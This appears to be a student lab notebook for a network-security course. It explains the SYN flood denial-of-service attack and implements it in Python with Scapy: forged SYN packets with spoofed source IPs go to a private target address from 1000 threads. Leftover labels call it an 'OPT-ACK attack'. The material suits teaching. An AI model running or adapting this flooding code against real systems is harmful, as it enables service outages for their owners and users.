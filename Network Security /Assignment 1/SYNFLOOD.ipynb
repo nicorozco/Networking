{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Introduction to SYN FLOOD attack\n",
    "\n",
    "## What is the SYN FLOOD Attack?\n",
    "\n",
    "The SYN FLOOD is a denial-of-service (DoS) attack that exploits a vulnerability in the TCP (Transmission Control Protocol) implementation. It leverages the SYN (Sychronize)flag in TCP packets to overwhelm a target system.\n",
    "\n",
    "In normal TCP communication, a three-way handshake establishes a connection:\n",
    "\n",
    "1.  **SYN (Synchronize):** The client sends a SYN packet to the server, initiating the connection.\n",
    "2.  **SYN-ACK (Synchronize-Acknowledge):** The server responds with a SYN-ACK packet, acknowledging the client's request and synchronizing its own sequence numbers.\n",
    "3.  **ACK (Acknowledge):** The client sends an ACK packet to the server, confirming the connection establishment.\n",
    "\n",
    "The attacker sends numerous TCP packets with the SYN flag set, but without actually creating a TCP Handshake exchange. The target's TCP stack then wastes resources trying to process and allocate resources to these SYN packets. This processing overhead can lead to performance degradation, resource exhaustion, and ultimately, denial of service.\n",
    "\n",
    "Key characteristics of the OPT-ACK attack:\n",
    "\n",
    "*   **Empty SYN :** The attack relies on sending SYN packets to initiate a TCP Connection but without actually finishing the establishment of a TCP connection .\n",
    "*   **Resource exhaustion:** The target's resources (CPU, memory) are consumed by allocating the appropriate resources needed for a TCP Connection. By Exhausting Resources, the target is no longer able to establish connections/communicate creating a denial of services"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "from scapy.layers.inet import TCP, IP\n",
    "import random\n",
    "import time\n",
    "import threading\n",
    "import signal\n",
    "import sys\n",
    "\n",
    "# Function to generate a range of spoofed addresses\n",
    "def generate_random_ip():\n",
    "    return f\"192.168.128.{random.randint(1, 254)}\"\n",
    "\n",
    "#Function to generate a range of random port numbers\n",
    "def generate_random_port():\n",
    "    return random.randint(1025, 65535)\n",
    "\n",
    "\n",
    "# Define target IP and port\n",
    "target_ip = \"192.168.128.5\"\n",
    "target_port = 80\n",
    "\n",
    "# Flag to control the attack loop\n",
    "attack_running = True"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now it's your turn..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"\"\"\n",
    "Sends optimized SYN packets to a target IP and port from a source IP and port in a loop.\n",
    "\n",
    "This function creates IP and TCP layers with high-end sequence and acknowledgment numbers,\n",
    "and sends the packets continuously until the global variable `attack_running` is set to False.\n",
    "\n",
    "Args:\n",
    "    target_ip (str): The target IP address to send packets to.\n",
    "    target_port (int): The target port to send packets to.\n",
    "Raises:\n",
    "    Exception: If there is an error sending a packet, it will be printed to the console.\n",
    "\"\"\"\n",
    "def send_opt_ack_attack(target_ip, target_port):\n",
    "    # Your code here\n",
    "\n",
    "\n",
    "    #creating an ip layer\n",
    "    ip_layer = IP(\n",
    "        src = generate_random_ip(),  #Set the Source IP Address\n",
    "        dst = target_ip   # Set the Target IP address\n",
    "    )\n",
    "\n",
    "    #creating an TCP Layer \n",
    "    tcp_layer = TCP(\n",
    "        sport = generate_random_port(),\n",
    "        dport = target_port,\n",
    "        flags = \"S\", # set flag to \"S\" for SYN Flood Attack \n",
    "        seq =  random.randint(0, 2**32 - 1),\n",
    "        ack =  random.randint(0, 2**32 - 1)\n",
    "        \n",
    "\n",
    "    )\n",
    "\n",
    "\n",
    "    packet = ip_layer / tcp_layer \n",
    "    \n",
    "  \n",
    "    # Remember to use the global variable attack_running to control the loop and to create the IP and TCP layers\n",
    "    # if the global variable is true, send packets \n",
    "    if attack_running:\n",
    "        send(packet, verbose = 0)     #send a packet\n",
    "    \n",
    "    pass\n",
    "\n",
    "\"\"\"\n",
    "Starts multiple threads to perform the optimized ACK attack.\n",
    "This function creates and starts a specified number of threads, each running the\n",
    "`send_opt_ack_attack` function to send packets to the target IP and port.\n",
    "Args:\n",
    "    threads_count (int): The number of threads to start for the attack.\n",
    "Raises:\n",
    "    Exception: If there is an error starting a thread, it will be printed to the console.\n",
    "\"\"\"\n",
    "def start_attack(threads_count):\n",
    "    threads = []\n",
    "    for i in range(threads_count):\n",
    "        t = threading.Thread(target=send_opt_ack_attack, args=(target_ip, target_port))\n",
    "        t.start()\n",
    "        threads.append(t)\n",
    "\n",
    "    for t in threads:\n",
    "        t.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting attack with 1000 threads...\n"
     ]
    }
   ],
   "source": [
    "# Signal handler for graceful shutdown\n",
    "def signal_handler(sig, frame):\n",
    "    global attack_running\n",
    "    print(\"Stopping attack...\")\n",
    "    attack_running = False\n",
    "    sys.exit(0)\n",
    "\n",
    "# Register signal handler\n",
    "signal.signal(signal.SIGINT, signal_handler)\n",
    "\n",
    "# Start the attack with 10 threads\n",
    "print(\"Starting attack with 1000 threads...\")\n",
    "start_attack(1000)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
